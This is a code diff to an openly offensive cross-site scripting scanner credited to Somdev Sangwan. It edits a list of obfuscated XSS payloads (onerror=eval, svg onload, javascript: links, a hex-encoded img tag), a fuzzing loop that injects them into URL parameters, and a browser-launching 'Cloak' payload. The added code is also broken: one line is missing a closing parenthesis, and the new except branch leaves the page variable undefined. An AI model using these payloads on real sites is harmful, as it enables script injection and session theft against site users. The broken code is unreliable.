@@ -42,8 +42,7 @@ vectors = [
 "<!--<img src=--><img src=x onerror=alert`` x>",
 "<a id=\"a\"href=javascript&colon;alert&lpar;1&rpar; id=\"a\">Click</a>",
 "\\\"><img sRc=l oNerrOr=prompt() x>",
-"%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e",
-"<iMg sRc=x:alert`` oNError=eval(src)>"
+"<iMg sRc=x:alert`` oNError=eval(src)>",
 "\"><sCript x>confirm``</script x>",
 "'\"><svg/onload=alert()>",
 "\"'><iMg sRc=x:alert`` oNError=eval(src)>",
@@ -519,7 +518,10 @@ def striker():
                                     progress = progress + 1
                                     enc = quote_plus(x)
                                     data = path+"?"+param_name+"="+pv+enc
-                                    page = br.open(data)
+                                    try:
+                                        page = br.open(data)
+                                    except:
+                                                           print Style.BRIGHT + Fore.RED + "\n[-] Target responded with HTTP 404 Error. Consider exiting.."
                                     sourcecode = page.read()
                                     if x in sourcecode:
                                         print "\n\033[1;32m[+]\033[1;m XSS Vulnerability Found! \n\033[1;32m[+]\033[1;m Parameter:\t%s\n\033[1;32m[+]\033[1;m Payload:\t%s" %(param_name,x)
@@ -703,6 +705,10 @@ def hulk():
     print "\033[1;33m[!]\033[1;m Payload 5. Marquee Magic"
     magic = URL.replace("d3v", "'\"><mArQuEe oNStart=confirm``>")
     webbrowser.open(magic)
+    work = raw_input("\033[1;34m[?]\033[1;m Press enter to execute next payload")
+    print "\033[1;33m[!]\033[1;m Payload 6. Cloak"
+    cloak = URL.replace("d3v", "%3c%69%4d%67%20%73%52%63%3d%78%3a%61%6c%65%72%74%60%60%20%6f%4e%45%72%72%6f%72%3d%65%76%61%6c%28%73%72%63%29%3e"
+    webbrowser.open(cloak)
     print "\033[1;33m[!]\033[1;m Hulk's stamina is over. Exiting..."
     sys.exit()
 print "        \033[1;31m\033[1;100mMade with <3 by Somdev Sangwan : TeamUltimate.in\033[1;m"
